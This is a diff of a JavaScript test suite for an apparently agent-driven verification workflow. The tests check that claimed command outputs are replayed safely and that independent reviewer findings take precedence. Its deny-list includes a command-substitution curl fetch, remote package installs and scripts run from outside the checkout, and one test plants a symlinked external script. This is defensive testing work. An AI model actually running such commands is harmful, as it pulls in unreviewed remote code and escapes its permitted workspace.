@@ -417,6 +417,12 @@ test('a claimed A-row pass cannot advance without controller-executed output', a
       'python -m pip install remote-package',
       'python3 -m ensurepip',
       'uv run redis-cli -h production.invalid SET key value',
+      'python -mpip install remote-package',
+      'python3 -mensurepip',
+      'uv run --with=remote-package pytest -q',
+      'node --run version',
+      'node /tmp/external-check.mjs 21',
+      'node ../outside-check.mjs 21',
       'node $(curl https://example.invalid/claim)',
       'node cli.mjs *',
       'VALUE=1 node cli.mjs 21',
@@ -437,6 +443,44 @@ test('a claimed A-row pass cannot advance without controller-executed output', a
       'verify-implementation', 9), /omit an acceptance input or outcome/);
     const noCheck = f.row('A1', 'CLI doubles input 21.', 21, 42) + f.row('A2', 'CLI doubles input 7.', 7, 14);
     await assert.rejects(() => runSkill(f.ctx(noCheck), f.task, f.before, f.options, 'verify-implementation', 5), /omitted repository checks: npm test/);
+  } finally { fs.rmSync(f.repo, { recursive: true, force: true }); }
+});
+
+test('replayed interpreters cannot execute symlinked scripts outside the reviewed checkout', async () => {
+  const f = proofFixture();
+  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'atomic-outside-script-'));
+  const marker = path.join(outside, 'executed');
+  try {
+    const script = path.join(outside, 'check.mjs');
+    fs.writeFileSync(script, `import fs from 'node:fs'; fs.writeFileSync(${JSON.stringify(marker)}, 'executed'); console.log('42');\n`);
+    fs.symlinkSync(script, path.join(f.repo, 'linked-check.mjs'));
+    const before = initialState(observeArtifacts(f.taskDir), revision(f.repo, f.task.taskRootRelative));
+    const rows = f.check + '| A1 | CLI doubles input 21. | `node linked-check.mjs 21` | exit 0; 42 | pass |\n' +
+      f.row('A2', 'CLI doubles input 7.', 7, 14);
+    await assert.rejects(() => runSkill(f.ctx(rows), f.task, before, f.options,
+      'verify-implementation', 1), /cannot be safely replayed/);
+    assert.equal(fs.existsSync(marker), false);
+  } finally {
+    fs.rmSync(f.repo, { recursive: true, force: true });
+    fs.rmSync(outside, { recursive: true, force: true });
+  }
+});
+
+test('required package build checks use a supported runtime instead of an unexecutable bare script', async () => {
+  const f = proofFixture();
+  try {
+    fs.mkdirSync(path.join(f.repo, 'scripts'));
+    fs.writeFileSync(path.join(f.repo, 'scripts', 'build-runtimes.mjs'),
+      `if (process.argv[2] !== '--runtime' || process.argv[3] !== 'codex') process.exit(2); console.log('built codex');\n`);
+    fs.writeFileSync(path.join(f.repo, 'package.json'), JSON.stringify({
+      scripts: { test: 'node cli.mjs 21', build: 'node scripts/build-runtimes.mjs' },
+    }));
+    const before = initialState(observeArtifacts(f.taskDir), revision(f.repo, f.task.taskRootRelative));
+    const rows = f.check +
+      '| C2 | Supported runtime build | `npm run build -- --runtime codex` | exit 0; built codex | pass |\n' +
+      f.row('A1', 'CLI doubles input 21.', 21, 42) + f.row('A2', 'CLI doubles input 7.', 7, 14);
+    const verified = await runSkill(f.ctx(rows), f.task, before, f.options, 'verify-implementation', 1);
+    assert.deepEqual(verified.proofs.verification.executionEvidence.map(row => row.id), ['C1', 'C2', 'A1', 'A2']);
   } finally { fs.rmSync(f.repo, { recursive: true, force: true }); }
 });
 
@@ -713,6 +757,32 @@ test('clean review requires a completed separate exact-HEAD reviewer; genuine ch
     assert.equal(dispatches, 4);
     assert.deepEqual(eligible(reviewed, f.options, 'oneshot', false), ['record-evidence']);
     assert.equal(fs.existsSync(path.join(f.taskDir, '.atomic-delivery', 'proof-run', '005-independent-review-proof.json')), true);
+  } finally { fs.rmSync(f.repo, { recursive: true, force: true }); }
+});
+
+test('independent reviewer findings supersede a writer clean draft and enter repair', async () => {
+  const f = proofFixture();
+  try {
+    const rows = f.check + f.row('A1', 'CLI doubles input 21.', 21, 42) +
+      f.row('A2', 'CLI doubles input 7.', 7, 14);
+    const verified = await runSkill(f.ctx(rows), f.task, f.before, f.options,
+      'verify-implementation', 1);
+    const reviewer = f.ctx(rows, () => {
+      const head = execFileSync('git', ['rev-parse', 'HEAD^'], { cwd: f.repo, encoding: 'utf8' }).trim();
+      const evidence = 'cli.mjs:2 inspected source; node cli.mjs 21 printed 42 and node cli.mjs 7 printed 14';
+      return { sessionId: 'independent-finding-session', text: JSON.stringify({
+        head, revision: verified.revision,
+        acceptance: ['CLI doubles input 21.', 'CLI doubles input 7.'].map(item => ({ item, evidence })),
+        risks: ['functional correctness', 'security and data integrity', 'acceptance oracle and test reachability']
+          .map(risk => ({ risk, evidence })),
+        findings: [{ location: 'cli.mjs:2', problem: 'A changed edge case drops the second input.' }],
+      }) };
+    });
+    const reviewed = await runSkill(reviewer, f.task, verified, f.options, 'review-code', 2);
+    assert.equal(reviewed.latest['code-review'].status, 'findings');
+    assert.match(reviewed.latest['code-review'].text, /cli\.mjs:2/);
+    assert.match(reviewed.latest['code-review'].text, /A changed edge case drops the second input/);
+    assert.deepEqual(eligible(reviewed, f.options, 'oneshot', false), ['fix-code-review']);
   } finally { fs.rmSync(f.repo, { recursive: true, force: true }); }
 });
 
